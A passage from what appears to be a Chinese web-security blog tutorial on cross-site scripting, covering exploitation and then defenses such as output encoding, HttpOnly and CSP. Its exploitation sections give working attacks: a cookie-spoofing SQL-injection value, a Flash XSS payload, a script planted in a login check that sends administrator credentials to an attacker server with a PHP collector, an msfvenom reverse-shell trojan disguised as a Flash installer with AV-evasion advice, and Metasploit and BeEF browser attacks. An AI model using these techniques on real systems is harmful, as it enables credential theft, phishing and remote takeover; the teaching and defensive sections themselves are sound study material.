+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;userid=1&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;username=li%27 or 1%3D1%23&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问后台 <code>http://192.168.80.139/cms/admin/</code>，成功登录：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20230826193726725.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20230826193726725.png"  alt="Cookie 欺骗成功" lazyload></a></p>
+<p><strong>Cookie 劫持的危害：</strong></p>
+<ul>
+<li>黑客拿到身份凭据，直接登录后台</li>
+<li>管理员注销登录后会话依然有效</li>
+<li>管理员修改密码后会话依然有效</li>
+</ul>
+<p><strong>防御：</strong></p>
+<ul>
+<li>单点登录</li>
+<li>Session 机制</li>
+<li>Token 值</li>
+<li>Cookie 设 HttpOnly</li>
+</ul>
+<h3 id="5-2-Flash-XSS-利用"><a href="#5-2-Flash-XSS-利用" class="headerlink" title="5.2 Flash XSS 利用"></a>5.2 Flash XSS 利用</h3><p>案例：phpwind CMS 存在 Flash XSS。</p>
+<p>反编译 swf 后搜 <code>ExternalInterface</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">this.jQuery = (((loaderInfo.parameters.jQuery + &quot;(&#x27;#&quot;) + loaderInfo.parameters.id) + &quot;&#x27;).jPlayer&quot;);</span><br><span class="line"></span><br><span class="line">private function init(_arg1:TimerEvent):void&#123;</span><br><span class="line">    this.myInitTimer.stop();</span><br><span class="line">    if (ExternalInterface.available)&#123;</span><br><span class="line">        ExternalInterface.call(this.jQuery, &quot;jPlayerFlashEvent&quot;, JplayerEvent.JPLAYER_READY, this.extractStatusData(this.commonStatus));</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/res/js/dev/util_libs/jPlayer/Jplayer.swf?jQuery=alert(1))&#125;catch(e)&#123;&#125;//</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/jindrapetrik/jpexs-decompiler/releases">Flash 反编译工具</a></p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225150909454.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225150909454.png"  alt="反编译工具" lazyload></a></p>
+<h3 id="5-3-UXSS-—-CVE-2021-34506"><a href="#5-3-UXSS-—-CVE-2021-34506" class="headerlink" title="5.3 UXSS — CVE-2021-34506"></a>5.3 UXSS — CVE-2021-34506</h3><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1fX4y1c7rX/?vd_source=7cb54e8da5c4e85dd5ca576825dc1c86">B 站视频演示</a></p>
+<p>Microsoft Edge 浏览器翻译功能导致 JS 语句被调用执行。</p>
+<h3 id="5-4-PDF-XSS"><a href="#5-4-PDF-XSS" class="headerlink" title="5.4 PDF XSS"></a>5.4 PDF XSS</h3><ol>
+<li>创建 PDF，加入 JS 动作</li>
+<li>上传获取直链</li>
+<li>直链被访问时触发</li>
+</ol>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225152606740.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225152606740.png"  alt="制作 PDF with JS" lazyload></a></p>
+<p><a target="_blank" rel="noopener" href="https://up.ly93.cc/">直链生成</a>，上传 PDF 生成链接。注意：火狐不触发。</p>
+<h3 id="5-5-表单劫持-权限维持"><a href="#5-5-表单劫持-权限维持" class="headerlink" title="5.5 表单劫持 &amp; 权限维持"></a>5.5 表单劫持 &amp; 权限维持</h3><blockquote>
+<p>条件：已取得 Web 相关权限</p>
+</blockquote>
+<p>环境：<a target="_blank" rel="noopener" href="http://v.metinfo.cn/dowload.php?ver=3.0">http://v.metinfo.cn/dowload.php?ver=3.0</a></p>
+<p><strong>方案一 — Cookie 劫持</strong></p>
+<p>登录成功后跳转 <code>admin/index.php</code>，在里面植入 XSS 脚本：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225164305814.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225164305814.png"  alt="admin&#x2F;index.php" lazyload></a></p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225164404943.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225164404943.png"  alt="插入脚本" lazyload></a></p>
+<p>Cookie 劫持失败——目标做了限制，拿到 Cookie 也无法直接登录。</p>
+<p><strong>方案二 — 表单劫持拿账密</strong></p>
+<p>到登录验证文件 <code>admin/login/login_check.php</code>：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225170552594.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225170552594.png"  alt="login_check.php" lazyload></a></p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225170933484.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225170933484.png"  alt="数据包" lazyload></a></p>
+<p>创建 <code>get.php</code> 接收账密：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>;</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;userinfo.txt&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$u</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="string">&#x27;|&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$p</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 <code>login_check.php</code> 的 <strong>MD5 加密之前</strong>插入：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$up=<span class="string">&#x27;&lt;script src=http://192.168.1.101:8089/get.php?user=&#x27;</span>.<span class="property">$metinfo_admin_name</span>.<span class="string">&#x27;&amp;pass=&#x27;</span>.<span class="property">$metinfo_admin_pass</span>.<span class="string">&#x27;&gt;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">echo $up;</span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225195621870.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225195621870.png"  alt="插入劫持代码" lazyload></a></p>
+<p>管理员登录时，账密发到攻击者服务器：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225200252086.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225200252086.png"  alt="收到请求" lazyload></a></p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225200105780.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225200105780.png"  alt="拿到账密" lazyload></a></p>
+<h3 id="5-6-Flash-钓鱼-MSF-捆绑上线"><a href="#5-6-Flash-钓鱼-MSF-捆绑上线" class="headerlink" title="5.6 Flash 钓鱼 + MSF 捆绑上线"></a>5.6 Flash 钓鱼 + MSF 捆绑上线</h3><blockquote>
+<p>条件：BeEF 上线或直接钓鱼</p>
+</blockquote>
+<p><strong>生成后门：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=6666 -f exe &gt; flash.exe</span><br></pre></td></tr></table></figure>
+
+<p>环境：<a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/Fake-flash.cn">Fake-flash.cn</a></p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225202520315.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225202520315.png"  alt="钓鱼页面" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20231225203008914.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225203008914.png"  alt="下载官方文件" lazyload></a></p>
+<p>选中两个一起压缩：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225203922485.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225203922485.png"  alt="压缩" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20231225203502032.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225203502032.png"  alt="设置1" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20231225203618296.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225203618296.png"  alt="设置2" lazyload></a></p>
+<p>设置解压前运行木马：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225203742068.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225203742068.png"  alt="解压前运行" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20231225204034193.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225204034193.png"  alt="生成" lazyload></a></p>
+<p>换图标（<a target="_blank" rel="noopener" href="https://www.pc6.com/">Restorator</a>）：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225204909807.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225204909807.png"  alt="Restorator" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20231225205035696.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225205035696.png"  alt="拖入" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/houmen.gif"><img   src="/images/loading.svg" data-src="/imgs/xss/houmen.gif"  alt="换图标" lazyload></a></p>
+<p>上传后门到 Kali <code>/var/www/html</code>，修改钓鱼页面下载链接：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225210245691.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225210245691.png"  alt="scp" lazyload></a><br><a class="simple-lightbox" href="/imgs/xss/image-20231225212027814.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225212027814.png"  alt="修改链接" lazyload></a></p>
+<p>MSF 监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 10.9.75.3</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225210953255.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225210953255.png"  alt="MSF" lazyload></a></p>
+<p><strong>诱导方式：</strong></p>
+<ul>
+<li>直接发送给目标</li>
+<li>XSS + BeEF 跳转钓鱼地址</li>
+</ul>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225212510270.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225212510270.png"  alt="BeEF 跳转" lazyload></a></p>
+<p>注：需做免杀，否则杀软会拦：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225212253789.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225212253789.png"  alt="杀软拦截" lazyload></a></p>
+<p>木马上线：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225212832985.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225212832985.png"  alt="上线" lazyload></a></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/76dbf18a8f65">https://www.jianshu.com/p/76dbf18a8f65</a></p>
+<h3 id="5-7-浏览器网马-MSF"><a href="#5-7-浏览器网马-MSF" class="headerlink" title="5.7 浏览器网马 + MSF"></a>5.7 浏览器网马 + MSF</h3><blockquote>
+<p>条件：BeEF 上线或直接钓鱼；浏览器存在漏洞</p>
+</blockquote>
+<p>依赖漏洞：MS14-064、CVE-2019-1367、CVE-2020-1380</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line"><span class="built_in">set</span> allowpowershellprompt <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> target 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>诱使受害者访问生成 URL。MS14-064 仅适用 WinXP：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225213810256.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225213810256.png"  alt="MS14-064" lazyload></a></p>
+<p>结合 XSS + BeEF 跳转：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231225214213702.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231225214213702.png"  alt="BeEF 跳转" lazyload></a></p>
+<hr>
+<h2 id="六、XSS-防御"><a href="#六、XSS-防御" class="headerlink" title="六、XSS 防御"></a>六、XSS 防御</h2><h3 id="6-1-输入过滤"><a href="#6-1-输入过滤" class="headerlink" title="6.1 输入过滤"></a>6.1 输入过滤</h3><p>永远不要相信用户输入。</p>
+<ul>
+<li>仅接受指定长度</li>
+<li>仅包含合法字符</li>
+<li>仅接收指定范围</li>
+<li>特殊格式（Email、IP）</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$keywords</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;keywords&#x27;</span>];</span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$keywords</span>);</span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>);</span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&gt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>);</span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>);</span><br><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$keywords</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$keywords</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-输出编码"><a href="#6-2-输出编码" class="headerlink" title="6.2 输出编码"></a>6.2 输出编码</h3><p>最核心的防御——HTML 实体编码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$keywords</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;keywords&#x27;</span> ] );</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-黑白名单"><a href="#6-3-黑白名单" class="headerlink" title="6.3 黑白名单"></a>6.3 黑白名单</h3><ul>
+<li>黑名单：禁止已知危险内容</li>
+<li>白名单：只允许已知安全内容（更可靠）</li>
+</ul>
+<h3 id="6-4-DOM-型-XSS-防御"><a href="#6-4-DOM-型-XSS-防御" class="headerlink" title="6.4 DOM 型 XSS 防御"></a>6.4 DOM 型 XSS 防御</h3><p>避免客户端文档重写、重定向等 DOM 操作中直接使用不可信数据。</p>
+<h3 id="6-5-HttpOnly"><a href="#6-5-HttpOnly" class="headerlink" title="6.5 HttpOnly"></a>6.5 HttpOnly</h3><p>禁止 JS 通过 <code>document.cookie</code> 访问 Cookie：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.cookie_httponly&quot;</span>, <span class="number">1</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php.ini：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.cookie_httponly = 1</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-6-CSP"><a href="#6-6-CSP" class="headerlink" title="6.6 CSP"></a>6.6 CSP</h3><p>限制页面资源加载和执行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: img-src &#x27;self&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>两种方式：HTTP 响应头 &#x2F; HTML meta 标签。都以 HTTP 响应头为准。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a1766855068/article/details/89370320">参考</a></p>
+<hr>
+<h2 id="七、XSS-测试代码"><a href="#七、XSS-测试代码" class="headerlink" title="七、XSS 测试代码"></a>七、XSS 测试代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCr&lt;<span class="title class_">ScRiPt</span>&gt;<span class="variable constant_">IPT</span>&gt;<span class="title class_">OonN</span><span class="string">&#x27;&quot;\/(hrHRefEF)&lt;/sCr&lt;/ScRiPt&gt;IPT&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、BeEF-框架"><a href="#八、BeEF-框架" class="headerlink" title="八、BeEF 框架"></a>八、BeEF 框架</h2><p>Kali 默认安装，用于 XSS 攻击和利用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install beef-xss</span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231224181948456.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231224181948456.png"  alt="安装" lazyload></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
+
+<p>再次 <code>apt-get install beef-xss</code>，启动：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231224182313659.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231224182313659.png"  alt="启动" lazyload></a></p>
+<p>访问 <code>http://&lt;your-ip&gt;:3000/ui/panel</code>：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231224182437174.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231224182437174.png"  alt="BeEF UI" lazyload></a></p>
+<p>CMS 留言板提交 BeEF hook：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231224182818482.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231224182818482.png"  alt="注入 hook" lazyload></a></p>
+<p>进入后台触发 JS：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231224183001396.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231224183001396.png"  alt="触发" lazyload></a></p>
+<p>浏览器上线：</p>
+<p><a class="simple-lightbox" href="/imgs/xss/image-20231224183114823.png"><img   src="/images/loading.svg" data-src="/imgs/xss/image-20231224183114823.png"  alt="上线" lazyload></a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53517370/article/details/128992559">更多功能介绍</a></p>
+<hr>
+<h2 id="九、靶场练习"><a href="#九、靶场练习" class="headerlink" title="九、靶场练习"></a>九、靶场练习</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/hxysaury/Target-Test/blob/main/%E9%9D%B6%E5%9C%BA/xsschallenge/xsschallenge.md">xsschallenge</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/132326585">DVWA XSS</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/132358623">Pikachu XSS</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/B_l_a_nk/article/details/129986237">CTFSHOW 361-331 XSS 绕过 WP</a><ul>
+<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1pQ4y1s7kH?p=39&vd_source=7cb54e8da5c4e85dd5ca576825dc1c86">B 站视频</a></li>
+</ul>
+</li>
+<li><a target="_blank" rel="noopener" href="https://domgo.at/cxss/intro">DomGoat 在线练习</a></li>
+</ul>
+<hr>
+<h2 id="十、在线-XSS-游戏"><a href="#十、在线-XSS-游戏" class="headerlink" title="十、在线 XSS 游戏"></a>十、在线 XSS 游戏</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://prompt.ml/">prompt.ml</a> — <a target="_blank" rel="noopener" href="https://github.com/cure53/xss-challenge-wiki/wiki/prompt.ml">答案</a></li>
+<li><a target="_blank" rel="noopener" href="http://escape.alf.nu/">escape.alf.nu</a> — <a target="_blank" rel="noopener" href="http://blog.163.com/cmdbat@126/blog/static/17029212320149385547765/">答案</a></li>
+<li><a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">XSS Game</a> — <a target="_blank" rel="noopener" href="http://www.manongjc.com/detail/61-hzybveyzftxpwzs.html">答案</a></li>
+<li><a target="_blank" rel="noopener" href="http://xss-quiz.int21h.jp/">XSS Quiz</a> — <a target="_blank" rel="noopener" href="http://blog.163.com/cmdbat@126/blog/static/1702921232013112542728566/">答案</a></li>
+</ul>
+<hr>
+<h2 id="十一、学习参考"><a href="#十一、学习参考" class="headerlink" title="十一、学习参考"></a>十一、学习参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/XSS">OWASP XSS</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/about/appsecurity/">Google App Security</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.freebuf.com/author/black-hole">FreeBuf — 黑洞（原理与剖析系列）</a></li>
+<li><a target="_blank" rel="noopener" href="http://html5sec.org/">HTML5 Security Cheatsheet</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.pkav.net/">PKAV</a></li>
+<li><a target="_blank" rel="noopener" href="https://xssing.org/">XSSing</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4067">先知社区 — XSS 全类型详解</a></li>
+</ul>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0"><span class="top-box-text">一、概述</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-1-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="top-box-text">1.1 是什么</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-2-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="top-box-text">1.2 攻击原理</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-3-%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="top-box-text">1.3 漏洞危害</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-4-PoC-%E9%AA%8C%E8%AF%81"><span class="top-box-text">1.4 PoC 验证</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB"><span class="top-box-text">二、漏洞分类</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-1-%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS"><span class="top-box-text">2.1 反射型 XSS</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-2-%E5%AD%98%E5%82%A8%E5%9E%8B-XSS"><span class="top-box-text">2.2 存储型 XSS</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-3-DOM-%E5%9E%8B-XSS"><span class="top-box-text">2.3 DOM 型 XSS</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-4-mXSS%EF%BC%88%E7%AA%81%E5%8F%98%E5%9E%8B%EF%BC%89"><span class="top-box-text">2.4 mXSS（突变型）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-5-UXSS%EF%BC%88%E9%80%9A%E7%94%A8%E5%9E%8B%EF%BC%89"><span class="top-box-text">2.5 UXSS（通用型）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-6-Flash-XSS"><span class="top-box-text">2.6 Flash XSS</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-7-UTF-7-XSS"><span class="top-box-text">2.7 UTF-7 XSS</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-8-MHTML-XSS"><span class="top-box-text">2.8 MHTML XSS</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-9-CSS-XSS"><span class="top-box-text">2.9 CSS XSS</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-10-VBScript-XSS"><span class="top-box-text">2.10 VBScript XSS</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%89%E3%80%81XSS-%E6%9E%84%E9%80%A0"><span class="top-box-text">三、XSS 构造</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-1-%E5%88%A9%E7%94%A8"><span class="top-box-text">3.1 利用 &lt; &gt;</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-2-JavaScript-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="top-box-text">3.2 JavaScript 伪协议</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-3-%E4%BA%8B%E4%BB%B6%E5%93%8D%E5%BA%94"><span class="top-box-text">3.3 事件响应</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%9B%9B%E3%80%81XSS-%E7%BB%95%E8%BF%87%E4%B8%8E%E5%8F%98%E5%BD%A2"><span class="top-box-text">四、XSS 绕过与变形</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-1-%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E6%8D%A2"><span class="top-box-text">4.1 大小写转换</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-2-%E5%85%B3%E9%94%AE%E5%AD%97%E5%8F%8C%E5%86%99"><span class="top-box-text">4.2 关键字双写</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-3-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BD%AC%E7%A0%81"><span class="top-box-text">4.3 伪协议转码</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-4-%E6%8F%92%E5%85%A5%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="top-box-text">4.4 插入特殊字符</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-5-%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="top-box-text">4.5 引号绕过</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-6-%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC"><span class="top-box-text">4.6 &#x2F; 代替空格</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-7-%E6%8B%86%E5%88%86%E8%B7%A8%E7%AB%99"><span class="top-box-text">4.7 拆分跨站</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%94%E3%80%81XSS-%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98"><span class="top-box-text">五、XSS 利用实战</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-1-Cookie-%E5%8A%AB%E6%8C%81-XSS-%E5%B9%B3%E5%8F%B0"><span class="top-box-text">5.1 Cookie 劫持 + 